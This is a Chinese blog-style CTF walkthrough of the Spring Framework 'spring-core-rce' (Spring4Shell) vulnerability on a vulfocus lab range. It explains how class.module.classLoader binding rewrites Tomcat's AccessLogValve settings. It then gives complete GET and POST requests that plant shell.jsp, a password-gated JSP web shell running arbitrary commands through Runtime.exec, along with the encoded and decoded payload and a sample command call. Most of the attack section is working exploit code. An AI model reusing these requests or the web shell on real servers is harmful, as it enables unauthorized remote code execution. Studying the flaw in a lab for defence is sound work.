---
title: 'vulfocusspring-core-rceSpring Framework 远程命令执行漏洞-漏洞简易解析+靶场使用建议'
abbrlink: e6d84953
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:22
---# vulfocus/spring-core-rce/Spring Framework 远程命令执行漏洞-漏洞简易解析+靶场使用建议

## 0x01 参考文章+漏洞简介+复现常见问题及建议

### 1.参考文章：

`https://blog.csdn.net/woai_zhongguo/article/details/125846680?ops_request_misc=elastic_search_misc&request_id=4d2bbd099f3ea2bcf6ea3d28d71767df&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125846680-null-null.142^v102^pc_search_result_base9&utm_term=Spring%20Framework%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20&spm=1018.2226.3001.4187`

### 2.漏洞介绍

```
 名称: vulfocus/spring-core-rce-2022-03-29:latest

 描述: 

Spring core是Spring系列产品中用来负责发现、创建并处理bean之间的关系的一个工具包，是一个包含Spring框架基本的核心工具包，Spring其他组件都要使用到这个包。

未经身份验证的攻击者可以使用此漏洞进行远程任意代码执行。 该漏洞广泛存在于Spring 框架以及衍生的框架中，并JDK 9.0及以上版本会受到影响。


```

### 3.复现常见问题及建议

这篇题解我一定会写，我自己再尝试复现的时候花了将近两个小时半的时间，哪怕是按照别人poc一步一步、一摸一样在做，也总是会复现失败，一直心里想到放弃但也会觉得不甘和可惜。如果碰到跟我一样情况的人，请耐心的检查自己的poc和payload，不要跟我一样太浮躁，最终花更多的时间来做重复性工作。

在此分享一下心得：

1.在进入网页抓包时如果没有显示cookie，请果断删除靶场并重新进入

2.理解每一块的内容，理解后你才不会搞混或者忘记某个步骤

3.靶场在倒数三分钟的时候可能会自动断连，这时候如果是最后一步然而你没有成功，不要放弃，重新开靶场。这不是你的问题。

4.按照官方题解做下来，显示jsp并没有被执行，怀疑是下面这段请求的问题

```
suffix: %>
prefix: <%Runtime
```

**生成内容：** `<%Runtime.getRuntime().exec... %>`

把 `<%` 和 `Runtime` 粘在一起，可能会误以为这是一个自定义标签（类似 `<%@` 或 `<%!`），从而导致解析失败，直接把整段当成字符串输出了。

![image-20260416192736087](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260416192736169.png)



## 0x02 思路

1.漏洞是怎么发生的？

通过spring的参数绑定机制拿到ClassLoader，然后拿着它可以去访问tomcat的全局配置对象中的AccessLogValue,那我们就获得了AccessLogValue实例的修改权，最后修改日志配置塞入木马

2.后续怎么触发木马？

访问服务器上任何页面。tomcat收到访问请求，触发AccessLogValue记录日志，而AccessLogValue会触发log(),此方法在执行时会拼接我们塞进去的pattern然后写入日志文件

再访问/shell.jsp，tomcat检测到jsp文件交给jasper引擎执行，代码中的塞入的`Runtime.getRuntime().exec()`被调用。



## 0x03 action

首先修改文件，成功后写入木马

打开文件解析成功

#### 1.修改日志配置（get/post）

```
?class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring&
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

分析：

| **属性名**                                                   | **Payload 中的路径**                                         | **构造的值**           | **作用**                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------------- | ------------------------------------------------------------ |
| **目录**                                                     | `class.module.classLoader.resources.context.parent.pipeline.first.directory` | `webapps/ROOT`         | 强制日志写到网站根目录。                                     |
| `class.module.classLoader.resources.context.parent.pipeline.first.prefix` | `shell`                                                      | 设定文件名为 `shell`。 |
| **后缀**                                                     | `class.module.classLoader.resources.context.parent.pipeline.first.suffix` | `.jsp`                 | 设定后缀，让 Tomcat 把它当脚本解析。                         |
| **日期格式**                                                 | `class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat` | `(留空)`               | **极其重要**。如果不留空，文件名会变成 `shell.2026-04-16.jsp`。 |
| **内容**                                                     | `class.module.classLoader.resources.context.parent.pipeline.first.pattern` | `%{c}i...%{f}i`        | 设定写入的内容，引用 Header 中的 `c` 和 `f`。                |

poc：

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 123.58.224.8:30344
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EF7D3C4294C60028BA7316C0E37EA916
```

写入后访问：http://123.58.224.8:15494/shell.jsp查看文件AccessLogValue记录日志，顺便看看也没有写入成功

#### 2.写入木马（此为简略版，完整版详见后面）（get/post）

pattern里面直接传<% ... %>可能会被拦截

因此利用占位符将内容的符号分开：内容放在body中，符号放在head头中

我们需要写入下面两部分：（来源于引用文章）

```
f:%>//
e:Runtime
c:<%

-----------------------------------------------------------------
url编码前的shell：
%{c}i if("d".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{e}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{f}i
 
url编码后的shell：
%25%7Bc%7Di%20if(%22d%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Be%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bf%7Di
```

以下为body内容的解析：

```
// 1. 校验：防止其他人利用你的 Shell
if("d".equals(request.getParameter("pwd"))) { 
    
    // 2. 执行：%{e}i 会被解析为 Runtime
    // 执行逻辑：java.lang.Runtime.getRuntime().exec(参数cmd中的内容)
    java.io.InputStream in = java.lang.Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); 
    
    // 3. 读取并回显：
    int a = -1; 
    byte[] b = new byte[2048]; 
    
    // 循环读取命令执行后的输出流（InputStream）
    while((a = in.read(b)) != -1) { 
        // 将读取到的二进制数据转为字符串，直接打印到网页（Out对象）
        out.println(new String(b)); 
    } 
}
```

payload：

```
POST / HTTP/1.1
Host: 123.58.224.8:30344
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EF7D3C4294C60028BA7316C0E37EA916
Content-Type: application/x-www-form-urlencoded
Content-Length: 403
f:%>//
e:Runtime
c:<%

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%7Di%20if(%22d%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Be%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bf%7Di
```

![image-20260416195620955](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260416195621019.png)

#### 3.写入成功访问日志文件并写入命令

```
http://123.58.224.8:15494/shell.jsp?pwd=d&cmd=ls%20/tmp
```

拿到flag

![image-20260416195646313](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260416195646362.png)





## 0x04 知识点

### 1.Tomcat 的日志占位符语法

Tomcat 的 `AccessLogValve` 允许开发者自定义日志格式。

在它的官方文档中，定义了一套类似于 C 语言 `printf` 的语法。其中有一个专门的指令：

> **语法：** `%{xxx}i` 
>
> **含义：** 记录传入请求（Incoming Request）中名为 `xxx` 的 **Header**（头信息）。

